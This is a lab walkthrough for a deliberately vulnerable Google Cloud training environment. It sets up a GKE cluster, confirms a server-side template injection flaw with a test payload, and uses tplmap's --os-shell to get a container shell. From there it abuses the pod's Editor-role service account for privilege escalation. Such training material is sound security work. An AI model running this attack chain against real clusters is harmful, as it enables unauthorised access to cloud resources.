## Attacking Google Kubernetes Engine 

Inorder to start the scenario go to the `scenario-4` folder by typing the below command in the `GCLOUD SHELL`

``` bash
cd scenario-4
```

> Note this scenarios requires you to run the both terraform and bash script 


First export the project id using the below command 

```bash
export PROJECT_ID="project-id"
```

```bash
export PROJECT_NUMBER=$(gcloud projects describe $PROJECT_ID --format="value(projectNumber)")
```

Next deploy the k8s cluster using the below command

```bash
gcloud services enable container.googleapis.com
```

```bash
gcloud container clusters create gcp-goat-cluster \
    --workload-pool=$PROJECT_ID.svc.id.goog --machine-type=n1-standard-1 \
    --num-nodes=2 --zone "asia-east1-a"
```

Now configure the `kubectl` to use the cluster by typing the below command

```bash
gcloud  container clusters get-credentials gcp-goat-cluster --zone "asia-east1-a"
```

> Note : It takes too long in order to setup the `kubernetes cluster` so be patient 🧘‍♂️


Once it is done create the namespace and kubernetes service account by typing the below command

```bash
kubectl create namespace test
```

```bash
kubectl create serviceaccount k8s-sa \
    --namespace test
```

Next deploy the necessary resources by typing the below command

```bash
terraform init
```

```bash
terraform apply -auto-approve -var project-id=$PROJECT_ID -var project_number=$PROJECT_NUMBER
```

Once it is done update the annotations of the `k8s-sa` service account by typing the below command

```bash
kubectl annotate serviceaccount \
    --namespace test k8s-sa \
    iam.gke.io/gcp-service-account=gcp-goat@$PROJECT_ID.iam.gserviceaccount.com
```

Deploy the application using the below command 

```bash
kubectl apply -f app.yaml -n test 
```

### Scenario info


According to the Official docs 

> Workload Identity allows a Kubernetes service account in your GKE cluster to act as an IAM service account. Pods that use the configured Kubernetes service account automatically authenticate as the IAM service account when accessing Google Cloud APIs. Using Workload Identity allows you to assign distinct, fine-grained identities and authorization for each application in your cluster.


In this scenario, we will deploy a vulnerable application to a Kubernetes cluster that has Workload Identity enabled. We will then exploit a vulnerability in the application and get the shell in the container, from there we will use the service account associated with the pod to perform the privilege escalation 

The application we were deployed is exposed via the node port on the port `30003`

First find the ip address of the node in order to access the application via nodeport by typing the below command

```bash
kubectl get nodes -o wide
```

> Note the ip address of the node

Verify the application is running by typing the below command 

```bash
kubectl get pods -n test
```

Next try to access the application by accessing the below url in the browser

```bash
http://<node-ip>:30003/page
```

The application that we deployed is vulnerable to `Server Side Template Injection` we are going to exploit it to get the shell in the container

We can verify that by typing the below payload in the `name` parameter by entering the below payload in the search box and click on the Generate page 

```bash
{{7*7}}
```

You can see the output as `49` which means the application is vulnerable to `Server Side Template Injection`

Next we are going to use the `tplmap` tool to exploit the `Server Side Template Injection` vulnerability 


In order to do that , first clone the tplmap repository by typing the below command in the `GCLOUD SHELL`

``` bash
git clone https://github.com/epinna/tplmap.git
```

Next move into the directory by typing the below command in the terminal

```bash
cd tplmap 
```

Next execute the below command to exploit the `Server Side Template Injection` vulnerability 

```bash
python3 tplmap.py -u http://<node-ip>:30003/page?name=gcp-goat --os-shell
```

You will get the shell in the container

Now we can use the `service account` associated with the pod to perform the privilege escalation

For example lets' try to list down the buckets in the project by typing the below command in the terminal

```bash
gsutil ls
```

You can find the list of buckets in the project

Since the service account has the `Editor` role we can perform as many actions as we want


If you are interested more on the `Kubernetes` I highly recommend to check out [Kubernetes-Goat](https://madhuakula.com/kubernetes-goat)
### Clean up


Exit from the os-shell by pressing `Ctrl + C`

To clean up the `Scenario` type the below command in the `GCLOUD SHELL`


``` bash
gcloud container clusters delete   gcp-goat-cluster --zone "asia-east1-a" -q 
```

> Make sure to delete the kubernetes cluster before deleting the terraform resources


```bash
cd scenario-4
```


```bash
terraform destroy -auto-approve -var project-id=$PROJECT_ID -var project_number=$PROJECT_NUMBER
```



Move into the previous folder by typing the below command in the `GCLOUD SHELL`

``` bash
cd ..
```
